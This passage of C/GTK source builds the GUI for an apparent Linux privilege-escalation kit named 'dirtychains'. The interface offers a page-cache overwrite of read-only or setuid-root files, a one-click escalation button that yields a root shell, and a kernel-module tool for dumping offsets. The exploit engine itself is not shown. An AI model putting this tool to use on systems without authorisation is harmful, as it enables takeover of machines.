                "#mainwin #logcard textview,\n"
                "#mainwin #logcard textview text {\n"
                "  background-image: none;\n"
                "  background-color: transparent;\n"
                "}\n"
                "#mainwin #sidescroll, #mainwin #sidescroll viewport {\n"
                "  background-color: transparent;\n"
                "}\n";
            GtkCssProvider *pa = gtk_css_provider_new();

            gtk_css_provider_load_from_data(pa, css_alpha, -1, NULL);
            gtk_style_context_add_provider_for_screen(
                scr,
                GTK_STYLE_PROVIDER(pa),
                GTK_STYLE_PROVIDER_PRIORITY_APPLICATION + 1);
            g_object_unref(pa);
        }
    }
}

static void make_log_tags(App *a)
{
    static const char *names[8] = {
        "fg-black", "fg-red", "fg-green", "fg-yellow",
        "fg-blue", "fg-magenta", "fg-cyan", "fg-white"
    };
    /* 浅色纸面配色, 保证在白底上也够深 */
    static const char *colors[8] = {
        "#6b7684", "#c0392b", "#1f7a3d", "#8a6100",
        "#1f5fa8", "#8b3fa8", "#0f6f7a", "#232b36"
    };
    int i;

    for (i = 0; i < 8; i++)
        a->tag_fg[i] = gtk_text_buffer_create_tag(a->logbuf, names[i],
                                                  "foreground", colors[i], NULL);
    a->tag_bold = gtk_text_buffer_create_tag(a->logbuf, "bold", "weight",
                                             PANGO_WEIGHT_BOLD, NULL);
    a->tag_dim = gtk_text_buffer_create_tag(a->logbuf, "dim", "foreground",
                                            "#8b96a3", NULL);
}

static GtkWidget *build_params(App *a)
{
    GtkWidget *grid = gtk_grid_new();
    GtkWidget *lbl, *browse;

    gtk_grid_set_row_spacing(GTK_GRID(grid), 6);
    gtk_grid_set_column_spacing(GTK_GRID(grid), 8);

    /* 三列统一: 标签 / 输入框 / 浏览按钮, 保证三行按钮右边缘对齐 */

    /* -t 目标 */
    lbl = gtk_label_new("-t 目标");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_widget_set_size_request(lbl, 68, -1);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 0, 1, 1);

    a->entry_target = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target),
                                   "留空则自动选择 setuid-root 的 su");
    gtk_widget_set_hexpand(a->entry_target, TRUE);
    gtk_grid_attach(GTK_GRID(grid), a->entry_target, 1, 0, 1, 1);

    a->lbl_t = lbl;
    browse = make_file_button("选择 setuid 目标", a->entry_target);
    a->browse_t = browse;
    gtk_grid_attach(GTK_GRID(grid), browse, 2, 0, 1, 1);

    /* -to 目标 */
    lbl = gtk_label_new("-to 目标");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 1, 1, 1);

    a->entry_to = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_to),
                                   "要被覆盖的文件 (只需可读)");
    gtk_widget_set_hexpand(a->entry_to, TRUE);
    gtk_grid_attach(GTK_GRID(grid), a->entry_to, 1, 1, 1, 1);

    a->lbl_to = lbl;
    browse = make_file_button("选择目标文件", a->entry_to);
    a->browse_to = browse;
    gtk_grid_attach(GTK_GRID(grid), browse, 2, 1, 1, 1);

    /* -set 内容 */
    lbl = gtk_label_new("-set 内容");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 2, 1, 1);

    a->entry_set = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_set),
                                   "内容来源文件");
    gtk_widget_set_hexpand(a->entry_set, TRUE);
    gtk_grid_attach(GTK_GRID(grid), a->entry_set, 1, 2, 1, 1);

    a->lbl_set = lbl;
    browse = make_file_button("选择内容文件", a->entry_set);
    a->browse_set = browse;
    gtk_grid_attach(GTK_GRID(grid), browse, 2, 2, 1, 1);

    /* 偏移 + 选项 */
    lbl = gtk_label_new("-offset");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 3, 1, 1);
    a->lbl_off = lbl;

    {
        GtkWidget *row = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);

        a->entry_offset = gtk_entry_new();
        gtk_entry_set_width_chars(GTK_ENTRY(a->entry_offset), 8);
        gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_offset), "0x0");
        gtk_widget_set_tooltip_text(a->entry_offset,
                                    "通用写起始偏移，支持 0x 前缀；留空为 0");
        gtk_box_pack_start(GTK_BOX(row), a->entry_offset, FALSE, FALSE, 0);

        a->chk_nobackup = gtk_check_button_new_with_label("不备份");
        gtk_widget_set_tooltip_text(a->chk_nobackup,
                                    "跳过写入前的备份。默认会先备份目标文件。");
        gtk_box_pack_start(GTK_BOX(row), a->chk_nobackup, FALSE, FALSE, 0);

        a->chk_verbose = gtk_check_button_new_with_label("详细日志");
        gtk_widget_set_tooltip_text(a->chk_verbose,
                                    "输出更多调试信息 (-v)，用于定位失败原因。");
        gtk_box_pack_start(GTK_BOX(row), a->chk_verbose, FALSE, FALSE, 0);

        a->off_row = row;
        gtk_grid_attach(GTK_GRID(grid), row, 1, 3, 2, 1);
    }

    /* 内核版本 (仅 OVS 链): 强制用哪个内核的 offset/ 表 */
    lbl = gtk_label_new("内核版本");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 4, 1, 1);
    a->lbl_krec = lbl;

    a->entry_krec = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_krec),
                                   "如 5.8.0-59-generic (仅 OVS 链)，留空自动匹配");
    gtk_widget_set_tooltip_text(a->entry_krec,
                                "传给 OVS 链的 -krec 参数，强制匹配 offset/ 下"
                                "指定内核版本的偏移表；留空则按运行内核自动选。");
    gtk_widget_set_hexpand(a->entry_krec, TRUE);
    gtk_grid_attach(GTK_GRID(grid), a->entry_krec, 1, 4, 1, 1);

    a->btn_pick_offset = gtk_button_new_with_label("选择 offset");
    gtk_widget_set_tooltip_text(a->btn_pick_offset,
                                "浏览 offset/ 目录下已有的 target.h 配置表，"
                                "选中后自动填进左侧内核版本框；也可在这里导入自定义表。");

    a->btn_vmlinux = gtk_button_new_with_label("解析 vmlinux");
    gtk_widget_set_tooltip_text(a->btn_vmlinux,
                                "用 pahole/BTF 解析本机内核结构偏移并生成 target.h，"
                                "写入程序目录的 offset/<内核版本>/ 供以后离线使用。\n"
                                "需要 pahole (sudo apt install dwarves)。");
    {
        GtkWidget *hb = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);

        gtk_box_pack_start(GTK_BOX(hb), a->btn_pick_offset, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(hb), a->btn_vmlinux, FALSE, FALSE, 0);
        gtk_grid_attach(GTK_GRID(grid), hb, 2, 4, 1, 1);
    }

    /*
     * root 获取偏移表 (仅 OVS 链): 没有 BTF / pahole / System.map 时,
     * 用随包的内核模块 krec_dump.ko 直接读本机偏移, 读完立刻卸掉。
     */
    lbl = gtk_label_new("root 偏移");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 5, 1, 1);
    a->lbl_root_off = lbl;

    {
        GtkWidget *hb = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
        GtkWidget *hint;

        a->btn_root_off = gtk_button_new_with_label("root 获取偏移表");
        gtk_widget_set_tooltip_text(a->btn_root_off,
            "以 root 加载 tools/kmod/krec_dump.ko，直接读出本机内核的"
            "结构体偏移和符号偏移，\n"
            "渲染成 target.h 写进 offset/，读完立刻 rmmod。\n"
            "适合没有 BTF / pahole / System.map 的内核；"
            "首次会现场编模块（需要 linux-headers-$(uname -r)）。");
        hint = gtk_label_new("加载 krec_dump.ko → 读偏移 → 写 target.h → 自动卸载");
        gtk_widget_set_name(hint, "roothint");
        gtk_widget_set_halign(hint, GTK_ALIGN_END);
        gtk_widget_set_valign(hint, GTK_ALIGN_CENTER);
        gtk_box_pack_start(GTK_BOX(hb), hint, TRUE, TRUE, 0);

        gtk_box_pack_start(GTK_BOX(hb), a->btn_root_off, FALSE, FALSE, 0);

        a->root_off_row = hb;
        gtk_grid_attach(GTK_GRID(grid), hb, 1, 5, 2, 1);
    }

    return grid;
}

static GtkWidget *build_actions(App *a)
{
    GtkWidget *box = gtk_button_box_new(GTK_ORIENTATION_HORIZONTAL);

    gtk_button_box_set_layout(GTK_BUTTON_BOX(box), GTK_BUTTONBOX_START);
    gtk_box_set_spacing(GTK_BOX(box), 6);

    a->btn_check = gtk_button_new_with_label("检查配置");
    gtk_widget_set_tooltip_text(a->btn_check,
                                "读取内核 .config 与模块状态，判断每条链的前提是否满足");
    gtk_container_add(GTK_CONTAINER(box), a->btn_check);

    a->btn_test = gtk_button_new_with_label("自测");
    gtk_widget_set_tooltip_text(a->btn_test,
                                "只写自己创建的临时文件，验证写原语是否真的生效");
    gtk_container_add(GTK_CONTAINER(box), a->btn_test);

    a->btn_find = gtk_button_new_with_label("扫描 setuid");
    gtk_widget_set_tooltip_text(a->btn_find,
                                "列出 setuid-root 文件并评估 nosuid / 只读挂载");
    gtk_container_add(GTK_CONTAINER(box), a->btn_find);

    a->btn_write = gtk_button_new_with_label("通用写");
    gtk_widget_set_tooltip_text(a->btn_write,
                                "把 -set 的内容写进 -to 的页缓存，写完校验但不执行");
    gtk_container_add(GTK_CONTAINER(box), a->btn_write);

    a->btn_lpe = gtk_button_new_with_label("一键提权");
    gtk_style_context_add_class(gtk_widget_get_style_context(a->btn_lpe),
                                "suggested-action");
    gtk_widget_set_tooltip_text(a->btn_lpe,
                                "执行所选链的 -start；成功后这里会变成 root shell");
    gtk_container_add(GTK_CONTAINER(box), a->btn_lpe);

    a->btn_stop = gtk_button_new_with_label("停止");
    gtk_style_context_add_class(gtk_widget_get_style_context(a->btn_stop),
                                "destructive-action");
    gtk_widget_set_sensitive(a->btn_stop, FALSE);
    gtk_container_add(GTK_CONTAINER(box), a->btn_stop);

    return box;
}

/*
 * 左上角「展开」拉开的任务抽屉。
 *
 * 条目按漏洞类别组织 (AEAD类 / ESP类 / UAF类 / OOB/越界写类)。
 * 单链类点击直接切链; OOB/越界写类聚合三条链, 点击后弹窗让用户挑。
 * 列表与顶部下拉框双向联动。
 */
#define SIDEBAR_W 268

/* chains 下标 -> 侧栏行号 (0 = 全部类); 多链类选中父行 */
static int cat_row_for_chain(int chain_idx)
{
    int c, i;

    for (c = 0; c < N_CATS; c++) {
        if (side_cats[c].members) {
            for (i = 0; i < side_cats[c].n; i++)
                if (side_cats[c].members[i] == chain_idx)
                    return c + 1;
        } else if (side_cats[c].first == chain_idx) {
            return c + 1;
        }
    }
    return -1;
}

static void side_select(App *a, int combo_idx)
{
    GtkListBoxRow *row;
    int row_idx;

    if (!a->task_list)
        return;
    if (combo_idx < 0) {
        /* 暂未选择 CVE: 清掉侧栏选中 */
        a->side_sync = TRUE;
        gtk_list_box_unselect_all(GTK_LIST_BOX(a->task_list));
        a->side_sync = FALSE;
        return;
    }
    row_idx = cat_row_for_chain(combo_idx - 1);
    if (row_idx < 0)
        return;
    row = gtk_list_box_get_row_at_index(GTK_LIST_BOX(a->task_list), row_idx);
    if (!row)
        return;
    a->side_sync = TRUE;
    gtk_list_box_select_row(GTK_LIST_BOX(a->task_list), row);
    a->side_sync = FALSE;
}

static void on_task_row_selected(GtkListBox *lb, GtkListBoxRow *row, gpointer data)
{
    App *a = data;
    int idx, cat;

    (void)lb;
    if (a->side_sync || !row)
        return;
    idx = gtk_list_box_row_get_index(row);
    if (idx < 0 || idx > N_CATS)
        return;

    if (idx == 0) {
        gtk_combo_box_set_active(GTK_COMBO_BOX(a->combo), 0);
        return;
    }

    cat = idx - 1;
    if (side_cats[cat].members) {
        /* 多链类: 当前链已在类里就保持, 否则落到位成员第一个,
         * 具体选哪个漏洞交给配置区上方的「漏洞选择」下拉框 */
        const int *m = side_cats[cat].members;
        int cur = gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo)) - 1;
        int k, in = -1;

        for (k = 0; k < side_cats[cat].n; k++)
            if (m[k] == cur)
                in = k;
        if (in < 0)
            gtk_combo_box_set_active(GTK_COMBO_BOX(a->combo), m[0] + 1);
    } else if (gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo)) !=
               side_cats[cat].first + 1) {
        gtk_combo_box_set_active(GTK_COMBO_BOX(a->combo),
                                 side_cats[cat].first + 1);
    }
}

static GtkWidget *build_task_sidebar(App *a)
{
    GtkWidget *box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 6);
    GtkWidget *scroller, *list;
    int i;

    gtk_widget_set_name(box, "sidebar");
    gtk_widget_set_size_request(box, SIDEBAR_W, -1);

    /* ── 条目列表 ── */
    scroller = gtk_scrolled_window_new(NULL, NULL);
    gtk_widget_set_name(scroller, "sidescroll");
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scroller),
                                   GTK_POLICY_NEVER, GTK_POLICY_AUTOMATIC);
    gtk_widget_set_vexpand(scroller, TRUE);

    list = gtk_list_box_new();
    gtk_widget_set_name(list, "tasklist");
    gtk_list_box_set_selection_mode(GTK_LIST_BOX(list), GTK_SELECTION_SINGLE);
    gtk_list_box_set_activate_on_single_click(GTK_LIST_BOX(list), TRUE);

    for (i = 0; i <= N_CATS; i++) {
        GtkWidget *row = gtk_list_box_row_new();
        GtkWidget *l = gtk_label_new(i == 0 ? "全部类 · 检查 / 自测"
                                            : side_cats[i - 1].name);
        GString *tip;

        gtk_label_set_xalign(GTK_LABEL(l), 0.0f);
        gtk_widget_set_halign(l, GTK_ALIGN_START);
        gtk_widget_set_valign(l, GTK_ALIGN_CENTER);

        tip = g_string_new(NULL);
        if (i == 0) {
            g_string_assign(tip, "依次检查 / 自测 dirtychains 各链");
        } else if (side_cats[i - 1].members) {
            const int *m = side_cats[i - 1].members;
            int k;

            g_string_assign(tip, "包含: ");
            for (k = 0; k < side_cats[i - 1].n; k++)
                g_string_append_printf(tip, "%s%s", k ? " / " : "",
                                       chains[m[k]].name);
            g_string_append(tip, "\n在配置区上方的「漏洞选择」框里挑具体漏洞");
        } else {
            g_string_assign(tip, chains[side_cats[i - 1].first].name);
        }
        gtk_widget_set_tooltip_text(row, tip->str);
        g_string_free(tip, TRUE);

        gtk_container_add(GTK_CONTAINER(row), l);
        gtk_container_add(GTK_CONTAINER(list), row);
    }
    a->task_list = list;
    g_signal_connect(list, "row-selected", G_CALLBACK(on_task_row_selected), a);

    gtk_container_add(GTK_CONTAINER(scroller), list);
    gtk_widget_set_margin_top(scroller, 12);
    gtk_widget_set_margin_start(scroller, 8);
    gtk_widget_set_margin_end(scroller, 8);
    gtk_widget_set_margin_bottom(scroller, 10);
    gtk_box_pack_start(GTK_BOX(box), scroller, TRUE, TRUE, 0);

    return box;
}

static GtkWidget *build_log_pane(App *a)
{
    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 6);
    GtkWidget *card = gtk_frame_new(NULL);
    GtkWidget *scroller = gtk_scrolled_window_new(NULL, NULL);
    GtkWidget *inrow = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    GtkWidget *lbl;

    /* 底色由 frame 负责: scrolledwindow 在部分 GTK 版本不画自身背景 */
    gtk_frame_set_shadow_type(GTK_FRAME(card), GTK_SHADOW_NONE);
    gtk_widget_set_name(card, "logcard");
    gtk_widget_set_vexpand(card, TRUE);

    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scroller),
                                   GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    gtk_widget_set_vexpand(scroller, TRUE);
    gtk_container_add(GTK_CONTAINER(card), scroller);
    /* 两个控件各有独立 GdkWindow, 都要自己保证底色 (见 on_panel_draw) */
    g_signal_connect(scroller, "draw", G_CALLBACK(on_panel_draw),
                     (gpointer)"#fbfdff");

    a->logview = gtk_text_view_new();
    a->logbuf = gtk_text_view_get_buffer(GTK_TEXT_VIEW(a->logview));
    gtk_text_view_set_editable(GTK_TEXT_VIEW(a->logview), FALSE);
    gtk_text_view_set_cursor_visible(GTK_TEXT_VIEW(a->logview), FALSE);
    gtk_text_view_set_monospace(GTK_TEXT_VIEW(a->logview), TRUE);
    gtk_text_view_set_pixels_above_lines(GTK_TEXT_VIEW(a->logview), 1);
    gtk_text_view_set_pixels_below_lines(GTK_TEXT_VIEW(a->logview), 1);
    gtk_text_view_set_wrap_mode(GTK_TEXT_VIEW(a->logview), GTK_WRAP_CHAR);
    gtk_text_view_set_left_margin(GTK_TEXT_VIEW(a->logview), 8);
    gtk_text_view_set_right_margin(GTK_TEXT_VIEW(a->logview), 8);
    gtk_text_view_set_top_margin(GTK_TEXT_VIEW(a->logview), 6);
    gtk_text_view_set_bottom_margin(GTK_TEXT_VIEW(a->logview), 6);
    gtk_widget_set_name(a->logview, "logview");
    gtk_container_add(GTK_CONTAINER(scroller), a->logview);
    g_signal_connect(a->logview, "draw", G_CALLBACK(on_panel_draw),
                     (gpointer)"#fbfdff");

    {
        GtkTextIter end;

        gtk_text_buffer_get_end_iter(a->logbuf, &end);
        a->log_end_mark = gtk_text_buffer_create_mark(a->logbuf, "end",
                                                      &end, FALSE);
    }
    make_log_tags(a);

    /* 输入行 */
    lbl = gtk_label_new("输入");
    gtk_box_pack_start(GTK_BOX(inrow), lbl, FALSE, FALSE, 0);
    a->entry_input = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_input),
                                   "回车发送；提权成功后这里是 root shell");
    gtk_widget_set_hexpand(a->entry_input, TRUE);
    gtk_box_pack_start(GTK_BOX(inrow), a->entry_input, TRUE, TRUE, 0);

    a->btn_send = gtk_button_new_with_label("发送");
    gtk_box_pack_start(GTK_BOX(inrow), a->btn_send, FALSE, FALSE, 0);

    a->btn_ctrlc = gtk_button_new_with_label("Ctrl-C");
    gtk_widget_set_tooltip_text(a->btn_ctrlc, "向子进程发送中断信号 (0x03)");
    gtk_box_pack_start(GTK_BOX(inrow), a->btn_ctrlc, FALSE, FALSE, 0);

    gtk_box_pack_start(GTK_BOX(vbox), card, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), inrow, FALSE, FALSE, 0);

    return vbox;
}

static void on_menu_help(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    const char *lines[] = {
        "检查配置", "  读取 /proc/config.gz 或 /boot/config-$(uname -r)，",
        "  逐条判断 CONFIG 与模块加载状态。",
        "",
        "自测", "  只写自己创建的临时文件（跳过 tmpfs），",
        "  验证写原语本机是否真的生效。不碰系统文件。",
        "",
        "扫描 setuid", "  -find：列出 setuid-root 文件，标注 nosuid / 只读挂载。",
        "",
        "通用写", "  用 -set 的内容覆盖 -to 的页缓存，可带 -offset。",
        "  目标只需读权限；写完会读回校验，但不执行。",
        "",
        "一键提权", "  执行 -start。成功后本窗口的输入行即是 root shell。",
        "",
        "退出码", "  0 完成   1 未通过   2 参数或前置条件   3 本机不可用",
        NULL
    };
    GString *s = g_string_new(NULL);
    int i;

    for (i = 0; lines[i]; i++) {
        g_string_append(s, lines[i]);
        g_string_append_c(s, '\n');
    }
    show_info(a, GTK_MESSAGE_INFO, "使用说明", "各按钮在做什么", s->str);
    g_string_free(s, TRUE);
}

static void on_menu_about(GtkWidget *w, gpointer data)
{
    App *a = data;
    char body[1024];

    (void)w;

    g_snprintf(body, sizeof(body),
               "构建: %s\n内核: %s\n用户: %s (uid=%u)\n引擎: %s\n\n"
               "仅供自有机器与授权测试使用。",
               DF_BUILD, kernel_release(), user_name(), (unsigned)getuid(),
               a->poc_builtin ? "内置 (本程序 --engine)"
                              : (a->poc_path ? a->poc_path : "(未找到)"));
    show_info(a, GTK_MESSAGE_INFO, "关于", APP_TITLE, body);
}

static void on_menu_clear(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    gtk_text_buffer_set_text(a->logbuf, "", -1);
    gtk_label_set_text(GTK_LABEL(a->status_lbl), "日志已清空");
    gtk_widget_set_name(a->status_lbl, "status-run");
}

static char *log_all_text(App *a)
{
    GtkTextIter s, e;

    gtk_text_buffer_get_bounds(a->logbuf, &s, &e);
    return gtk_text_buffer_get_text(a->logbuf, &s, &e, FALSE);
}

static void on_menu_save(GtkWidget *w, gpointer data)
{
    App *a = data;
    GtkWidget *dlg;

    (void)w;
    dlg = gtk_file_chooser_dialog_new("保存日志", GTK_WINDOW(a->window),
                                      GTK_FILE_CHOOSER_ACTION_SAVE,
                                      "取消", GTK_RESPONSE_CANCEL,
                                      "保存", GTK_RESPONSE_ACCEPT, NULL);
    gtk_file_chooser_set_current_name(GTK_FILE_CHOOSER(dlg), "dirtychains-log.txt");
    gtk_file_chooser_set_do_overwrite_confirmation(GTK_FILE_CHOOSER(dlg), TRUE);

    if (gtk_dialog_run(GTK_DIALOG(dlg)) == GTK_RESPONSE_ACCEPT) {
        char *fn = gtk_file_chooser_get_filename(GTK_FILE_CHOOSER(dlg));
        char *txt = log_all_text(a);

        if (fn && txt && g_file_set_contents(fn, txt, -1, NULL)) {
            char msg[PATH_MAX + 32];
            g_snprintf(msg, sizeof(msg), "日志已保存: %s", fn);
            gtk_label_set_text(GTK_LABEL(a->status_lbl), msg);
        } else {
            gtk_label_set_text(GTK_LABEL(a->status_lbl), "保存失败");
          }
        g_free(txt);
        g_free(fn);
    }
    gtk_widget_destroy(dlg);
}

static void on_menu_copy(GtkWidget *w, gpointer data)
{
    App *a = data;
    char *txt = log_all_text(a);

    (void)w;
    gtk_clipboard_set_text(gtk_clipboard_get(GDK_SELECTION_CLIPBOARD), txt, -1);
    g_free(txt);
    gtk_label_set_text(GTK_LABEL(a->status_lbl), "日志已复制到剪贴板");
}

static void on_window_destroy(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    if (a->running) {
        app_kill(a, SIGKILL);
        g_spawn_close_pid(a->pid);
    }
    gtk_main_quit();
}

static GtkWidget *build_header(App *a)
{
    GtkWidget *hb = gtk_header_bar_new();
    GtkWidget *mb = gtk_menu_button_new();
    GtkWidget *menu = gtk_menu_new();
    GtkWidget *mi;

    gtk_header_bar_set_title(GTK_HEADER_BAR(hb), APP_TITLE);
    gtk_header_bar_set_subtitle(GTK_HEADER_BAR(hb), APP_SUBTITLE);
    gtk_header_bar_set_show_close_button(GTK_HEADER_BAR(hb), TRUE);

    /* 左上角: 展开 / 收起扩展面板 */
    {
        GtkWidget *ebox = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 4);

        a->img_expand = gtk_image_new_from_icon_name("go-next-symbolic",
                                                     GTK_ICON_SIZE_MENU);
        a->lbl_expand = gtk_label_new("展开");
        gtk_box_pack_start(GTK_BOX(ebox), a->img_expand, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(ebox), a->lbl_expand, FALSE, FALSE, 0);

        a->btn_expand = gtk_toggle_button_new();
        gtk_widget_set_valign(a->btn_expand, GTK_ALIGN_CENTER);
        gtk_container_add(GTK_CONTAINER(a->btn_expand), ebox);
        gtk_widget_set_tooltip_text(a->btn_expand, "展开 / 收起扩展面板");
        g_signal_connect(a->btn_expand, "toggled",
                         G_CALLBACK(on_toggle_expand), a);
        gtk_header_bar_pack_start(GTK_HEADER_BAR(hb), a->btn_expand);
    }

    gtk_button_set_image(GTK_BUTTON(mb),
                         gtk_image_new_from_icon_name("open-menu-symbolic",
                                                      GTK_ICON_SIZE_BUTTON));
    gtk_widget_set_tooltip_text(mb, "菜单");

    mi = gtk_menu_item_new_with_label("复制日志");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_copy), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("保存日志…");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_save), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("清空日志");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_clear), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("使用说明");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_help), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_separator_menu_item_new();
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("关于");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_about), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    gtk_widget_show_all(menu);
    gtk_menu_button_set_popup(GTK_MENU_BUTTON(mb), menu);
    gtk_header_bar_pack_end(GTK_HEADER_BAR(hb), mb);

    /* 右上角: 当前选中的 CVE (未选时提示) */
    a->cve_hint_lbl = gtk_label_new("暂未选择CVE");
    gtk_widget_set_name(a->cve_hint_lbl, "cvehint");
    gtk_widget_set_valign(a->cve_hint_lbl, GTK_ALIGN_CENTER);
    gtk_widget_set_margin_end(a->cve_hint_lbl, 8);
    gtk_header_bar_pack_end(GTK_HEADER_BAR(hb), a->cve_hint_lbl);

    return hb;
}

static void build_window(App *a)
{
    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);
    GtkWidget *head = gtk_box_new(GTK_ORIENTATION_VERTICAL, 6);
    GtkWidget *chainbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 4);
    GtkWidget *frame_params, *frame_actions, *pane, *overlay;
    GtkWidget *statusbar = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    char status[256];

    a->window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(a->window), APP_TITLE);
    /* 小屏幕 (1024x600 之类) 上不要撑出屏幕外, 留出面板和标题栏 */
    {
        GdkDisplay *dpy = gdk_display_get_default();
        GdkMonitor *mon = dpy ? gdk_display_get_primary_monitor(dpy) : NULL;
        GdkRectangle geo = { 0, 0, 1280, 800 };
        int ww, hh;

        if (mon)
            gdk_monitor_get_workarea(mon, &geo);   /* 已扣掉面板/任务栏 */
        /* 左右各留 40px: 小屏上窗口贴边后不容易再拖回来 */
        ww = MIN(1180, geo.width - 80);
        hh = MIN(820, geo.height - 90);
        if (ww < 640)
            ww = 640;
        if (hh < 460)
            hh = 460;
        gtk_window_set_default_size(GTK_WINDOW(a->window), ww, hh);
    }
    gtk_window_set_icon_name(GTK_WINDOW(a->window), "security-high");
    gtk_widget_set_name(a->window, "mainwin");

    a->header = build_header(a);
    gtk_window_set_titlebar(GTK_WINDOW(a->window), a->header);

    /* 背景层: overlay 的底层 child, 随窗口伸缩 */
    overlay = gtk_overlay_new();
    a->bg_area = gtk_drawing_area_new();
    gtk_widget_set_hexpand(a->bg_area, TRUE);
    gtk_widget_set_vexpand(a->bg_area, TRUE);
    g_signal_connect(a->bg_area, "draw", G_CALLBACK(on_bg_draw), a);
    g_signal_connect(a->window, "configure-event", G_CALLBACK(on_configure), a);
    gtk_container_add(GTK_CONTAINER(overlay), a->bg_area);
    gtk_container_add(GTK_CONTAINER(a->window), overlay);

    /* ── 顶部: 链选择 + 说明 ── */
    gtk_widget_set_name(head, "chainbox");
    gtk_widget_set_margin_start(head, 12);
    gtk_widget_set_margin_end(head, 12);
    gtk_widget_set_margin_top(head, 8);

    /*
     * 主链下拉框已从界面上移除: 链的状态仍存在 a->combo 里,
     * 由侧栏类别和「漏洞选择」框驱动, 但控件本身不再显示。
     * 初始 active = -1 表示"暂未选择CVE"。
     */
    a->combo = gtk_combo_box_text_new();
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->combo),
                                   "全部（dirtychains 十链，仅检查 / 自测）");
    {
        int i;
        for (i = 0; i < N_CHAINS; i++) {
            char label[128];
            g_snprintf(label, sizeof(label), "%s", chains[i].tag);
            gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->combo), label);
        }
    }
    gtk_combo_box_set_active(GTK_COMBO_BOX(a->combo), -1);
    gtk_widget_set_no_show_all(a->combo, TRUE);
    gtk_box_pack_start(GTK_BOX(chainbox), a->combo, FALSE, FALSE, 0);

    a->lbl_name = gtk_label_new(NULL);
    gtk_widget_set_halign(a->lbl_name, GTK_ALIGN_START);
    gtk_label_set_use_markup(GTK_LABEL(a->lbl_name), TRUE);
    gtk_widget_set_name(a->lbl_name, "title-name");
    gtk_box_pack_start(GTK_BOX(chainbox), a->lbl_name, FALSE, FALSE, 0);

    a->lbl_desc = gtk_label_new(NULL);
    gtk_label_set_xalign(GTK_LABEL(a->lbl_desc), 0.0f);
    gtk_label_set_line_wrap(GTK_LABEL(a->lbl_desc), TRUE);
    gtk_box_pack_start(GTK_BOX(chainbox), a->lbl_desc, FALSE, FALSE, 0);

    a->lbl_need = gtk_label_new(NULL);
    gtk_widget_set_name(a->lbl_need, "hint");
    gtk_label_set_xalign(GTK_LABEL(a->lbl_need), 0.0f);
    gtk_label_set_line_wrap(GTK_LABEL(a->lbl_need), TRUE);
    gtk_box_pack_start(GTK_BOX(chainbox), a->lbl_need, FALSE, FALSE, 0);

    gtk_box_pack_start(GTK_BOX(head), chainbox, FALSE, FALSE, 0);

    /* ── root 警告横幅 ── */
    a->banner = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
    gtk_widget_set_name(a->banner, "banner-warn");
    a->banner_lbl = gtk_label_new(NULL);
    gtk_label_set_xalign(GTK_LABEL(a->banner_lbl), 0.0f);
    gtk_label_set_line_wrap(GTK_LABEL(a->banner_lbl), TRUE);
    gtk_box_pack_start(GTK_BOX(a->banner), a->banner_lbl, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(head), a->banner, FALSE, FALSE, 0);
    gtk_widget_set_no_show_all(a->banner, TRUE);

    /* ── 参数区 ── */
